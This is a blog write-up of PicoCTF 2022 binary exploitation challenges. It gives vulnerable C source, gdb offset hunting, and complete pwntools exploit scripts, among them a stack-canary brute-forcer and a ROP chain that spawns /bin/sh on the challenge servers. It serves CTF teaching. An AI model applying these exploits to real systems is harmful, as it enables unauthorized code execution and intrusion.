---
layout: post
title: PicoCTF 2022 - Binary Exploitation
categories:
  - picoctf
slug: picoctf-binary
tags:
  - buffer overflow
  - gdb
  - radare2
---

# Binary Overflow 0

## Challenge
```
Smash the stack
Let's start off simple, can you overflow the correct buffer?
The program is available here.
You can view source here. And connect with it using:
nc saturn.picoctf.net 55986
```
## Static code analysis
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

We can see that the program handles SIGSEGV by itself by giving away the flag. We should only have to overflow the buffer, which has a size of 16, to cause a SIGSEGV fault

## Solution

- Overflow the buffer
```bash
$ nc saturn.picoctf.net 55986
Input: AAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_ee2fd2b1}
```

# Buffer Overflow 1

## Challenge

```
Control the return address
Now we're cooking! You can overflow the buffer and return to the flag function in the program.
You can view source here.
And connect with it using nc saturn.picoctf.net 59626
```

## Solution

- Find padding to EIP

```bash
gdb-peda$ pattern create 150
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'

gdb-peda$ run
Starting program: vuln 
Please enter your string: 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA
Okay, time to return... Fingers Crossed... Jumping to 0x41414641

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x41 ('A')
EBX: 0x61414145 ('EAAa')
ECX: 0x41 ('A')
EDX: 0xffffffff 
ESI: 0x1 
EDI: 0x80490e0 (<_start>:       endbr32)
EBP: 0x41304141 ('AA0A')
ESP: 0xff9e05e0 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA")
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xff9e05e0 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA")
0004| 0xff9e05e4 ("AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA")
0008| 0xff9e05e8 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA")
0012| 0xff9e05ec ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA")
0016| 0xff9e05f0 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA")
0020| 0xff9e05f4 ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA")
0024| 0xff9e05f8 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA")
0028| 0xff9e05fc ("AA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()

gdb-peda$ pattern offset 0x41414641
1094796865 found at offset: 44
```

- Find address of vulnerable function to jump to

```bash
gdb-peda$ info functions
[...]
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  win
0x08049281  vuln
0x080492c4  main
0x0804933e  get_return_address
0x08049350  __libc_csu_init
0x080493c0  __libc_csu_fini
0x080493c5  __x86.get_pc_thunk.bp
0x080493cc  _fini
```

The address of the win function is 0x080491f6

- Exploit and win


```python
#!/usr/bin/env python
import sys
import warnings
from pwn import *
from struct import pack

## Configuration
binary = '/home/h3x/work/ctf/picoctf/bof1/vuln'
eip_offset = 44
targetAddr = 0x080491f6
promptChar = ':'

warnings.filterwarnings("ignore")

def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([binary] + argv, *a, **kw)

## Setup and start process
elf = context.binary = ELF(binary, checksec=False)
if args.REMOTE:
    print('Exploiting {a}:{b}'.format(a=sys.argv[1],b=sys.argv[2]))
else:
    print('Exploiting {a}'.format(a=binary))
context.log_level = 'error'
proc = start()

## Exploit
print('  [*] EIP offset is set at {a}'.format(a=eip_offset))

# payload
chain = []
chain.append('A' * eip_offset)
chain.append(p32(targetAddr))
payload = flat(chain)

# run the exploit
print('  [*] Sending payload')
#proc.recvuntil(promptChar).decode()
proc.sendlineafter(promptChar,payload)
print('  [*] Printing program output')
print(proc.readall().decode('utf-8',errors='ignore'))
```
```bash
$ python solve.py REMOTE {'saturn.picoctf.net',59626}
Exploiting saturn.picoctf.net:59626
  [*] EIP offset is set at 44
  [*] Sending payload
  [*] Printing program output
 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_60fac6aa}
```

# Buffer Overflow 2

## Challenge

```
Control the return address and arguments
```

## Static Code Analysis

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

The functions are almost the same as the previous challenge except the win function now needs 2 arguments with values of 0xCAFEF00D and 0xF00DF00D to leak the flag

## Solution

```python
#!/usr/bin/env python
import sys
import warnings
from pwn import *
from struct import pack

def start(argv=[], *a, **kw):
    if args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([binary] + argv, *a, **kw)

# binary configuration
binary = './vuln'
elf = context.binary = ELF(binary, checksec=False)
if args.REMOTE:
    print('Exploiting {a}:{b}'.format(a=sys.argv[1],b=sys.argv[2]))
else:
    print('Exploiting {a}'.format(a=binary))
context.log_level = 'error'
## Exploit

# configuration
eip_offset = 112
print('  [*] EIP offset is set at {a}'.format(a=eip_offset))
promptChar = ':'

# start process
proc = start()

# payload
chain = []
chain.append('A' * eip_offset)
chain.append(p32(0x08049296))
chain.append('B' * 4)
chain.append(p32(0xcafef00d))
chain.append(p32(0xf00df00d))
payload = flat(chain)

# run the exploit
print('  [*] Sending payload')
proc.recvuntil(promptChar).decode()
proc.sendline(payload)
print('  [*] Printing program output')
print(proc.readall().decode('utf-8',errors='ignore'))
```

# Buffer Overflow 3

## Challenge

```
Do you think you can bypass the protection and get the flag?
```

## Static Code Analysis

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("%s %s %s","Global Canary: ",global_canary,"\n");
   printf("%s %s %s","Canary: ",canary,"\n");
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);
   printf("%s %s %s","Global Canary: ",global_canary,"\n");
   printf("%s %s %s","Canary: ",canary,"\n");
   if (memcmp(canary,global_canary,CANARY_SIZE)) {

      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

This time, the vuln function has a buffer overflow protection called a canary. The goal the the stack canary is to detect stack modification. If the canary if overwritten, the program will fail.

This means if we want to overwrite EIP, we will have to find the value of the canary and his position in the stack

## Solution

### Finding canary offset

To find the canary offset, we will send an ever growing payload, until the program crashes with error message `***** Stack Smashing Detected ***** : Canary Value Corrupt!`

```python
from pwn import *
context.log_level = 'error'
for i in range(100):
    pad = 'A'*(i+1)
    dummycanary = 'D'
    payload = pad #+ dummycanary
    r = process('./vuln')
    r.writeline(str(len(payload)))
    r.writeline(payload)
    resp = r.readall()
    if b'Smash' in resp:
        print('Offset: ({a})'.format(a=len(payload) - 1))
        break
    else:
        r.close()
```
Output:
```
64
```

This script returns an offset of 64

Now that we know where in the stack the canary, we have to find it's value

What we will do is build a buffer of 64 chars to reach the canary, then we'll try every printable characters at every position until the program doesn't give any errors

```python
from pwn import *
offset = 64
context.log_level = 'error'
canary = ''
for p in range(4):
    for c in range(33,126):
        padding = 'A' * offset
        payload = padding + canary + chr(c)
        r = process('./vuln')
        r.writeline(str(len(payload)))
        r.writeline(payload)
        resp = r.readall()
        if b'Ok...' in resp:
            canary += chr(c)
            print(canary)
            break
        r.close()
        if len(canary) == 4:
            break
```
Output:
```
1
13
133
1337
```

Now that we have the position and value of the canary, we are ready to find the offset to reach EIP. We'll be using GDB for this task:



```bash
$ gdb-peda -q ./vuln   
Reading symbols from ./vuln...
(No debugging symbols found in ./vuln)
gdb-peda$ python print('A' * 64 + '1337')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1337
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ run
Starting program: /home/h3x/work/ctf/picoctf/bof3/vuln 
warning: Error disabling address space randomization: Operation not permitted
How Many Bytes will You Write Into the Buffer?
> 200
Input> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1337AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
Ok... Now Where's the Flag?

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41414241 ('ABAA')
ECX: 0x6c0 
EDX: 0xf7f31d67 --> 0xf330d40a 
ESI: 0x1 
EDI: 0x8049220 (<_start>:       endbr32)
EBP: 0x6e414124 ('$AAn')
ESP: 0xffe6b4f0 ("A-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
EIP: 0x41434141 ('AACA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41434141
[------------------------------------stack-------------------------------------]
0000| 0xffe6b4f0 ("A-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
0004| 0xffe6b4f4 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
0008| 0xffe6b4f8 ("AA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
0012| 0xffe6b4fc ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
0016| 0xffe6b500 ("EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
0020| 0xffe6b504 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
0024| 0xffe6b508 ("AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
0028| 0xffe6b50c ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41434141 in ?? ()
gdb-peda$ pattern offset 0x41434141
1094926657 found at offset: 16
```

EIP is 16 bytes past the canary

Now let's find out the address to jump to

```bash
gdb-peda$ info functions
[...]
0x08049330  frame_dummy
0x08049336  win <---------
0x080493d5  read_canary
0x08049461  vuln
0x08049588  main
0x08049600  __libc_csu_init
[...]
```

With everything in hands, let's pwn the binary. Here's the full exploit script:

```python
#!/usr/bin/env python
import sys
import warnings
from pwn import *
from struct import pack
context.log_level = 'ERROR'
warnings.filterwarnings("ignore")

def bfcanary(offset):
    canary = ''
    for p in range(4):
        for c in range(33,126):
            padding = 'A' * offset
            payload = padding + canary + chr(c)
            proc = remote('saturn.picoctf.net',58840) 
            proc.sendlineafter(promptChar,str(len(payload)))
            proc.sendlineafter(promptChar,payload)
            resp = proc.readall()
            if b'Ok...' in resp:
                canary += chr(c)
                break
            proc.close()
            if len(canary) == 4:
                break
    return canary

## Configuration
canary_offset = 64
binary = '/home/h3x/work/ctf/picoctf/bof3/vuln'
eip_offset = 16
targetAddr = 0x08049336
promptChar = '>'

print('Exploit Started')

## Find canary value
print('  [*] Bruteforcing Canary...')
canary = bfcanary(canary_offset)
print('  [*] Canary value found: {a}'.format(a=canary))

## Setup and start process
context.log_level = 'error'
proc = remote('saturn.picoctf.net',58840)

## Exploit
print('  [*] EIP offset is set at {a}'.format(a=eip_offset))

# payload
chain = []
chain.append('A' * canary_offset)
chain.append(canary)
chain.append('B' * eip_offset)
chain.append(p32(targetAddr))
payload = flat(chain)

# run the exploit
print('  [*] Sending payload')
#proc.recvuntil(promptChar).decode()
proc.sendlineafter(promptChar,'200')
proc.sendlineafter(promptChar,payload)
print('  [*] Printing program output')
print(proc.readall().decode('utf-8',errors='ignore'))
```

Output:
```bash
$ python solve.py
Exploit Started
  [*] Bruteforcing Canary...
  [*] Canary value found: BiRd
  [*] EIP offset is set at 16
  [*] Sending payload
  [*] Printing program output
 Ok... Now Where's the Flag?
picoCTF{Stat1C_c4n4r13s_4R3_b4D_f7c1f50a}
```

# ropfu

## Challenge

```
What's ROP

Hint: A classic ROP to get a shell
```

## Solution

To get this flag, I had to do a ROP exploit to launch a shell via syscall.

I spent a loooot of time trying to build a payload by myself by checking gadgets one by one. I finally figured that ROPgadget (which I was using to the thing by hands) can give away the solution :

```bash
$ ROPgadget --binary vuln --rop --badbytes "0a"
[...]
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = ''

p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b074a) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5064) # @ .data + 4
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b074a) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x08049e39) # pop ecx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080e5060) # padding without overwrite ebx
p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0804a3d2) # int 0x80
```

I just had to use the output from ROPgadget to complete the exploit script:

```python
#!/usr/bin/env python2
# execve generated by ROPgadget
from pwn import *
from struct import pack

# Padding goes here
p = b'A' * 28

p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b074a) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5064) # @ .data + 4
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b074a) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x08049e39) # pop ecx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080e5060) # padding without overwrite ebx
p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0804a3d2) # int 0x80
proc = remote('saturn.picoctf.net',57096)
proc.recvuntil('!\n')
proc.sendline(p)
proc.interactive()
```

Output:

```bash
$ python exploit.py                              
[+] Opening connection to saturn.picoctf.net on port 57096: Done
  proc.recvuntil('!\n')
[*] Switching to interactive mode
$ ls
flag.txt
vuln
$ cat flag.txt
picoCTF{5n47ch_7h3_5h311_029ab653}
```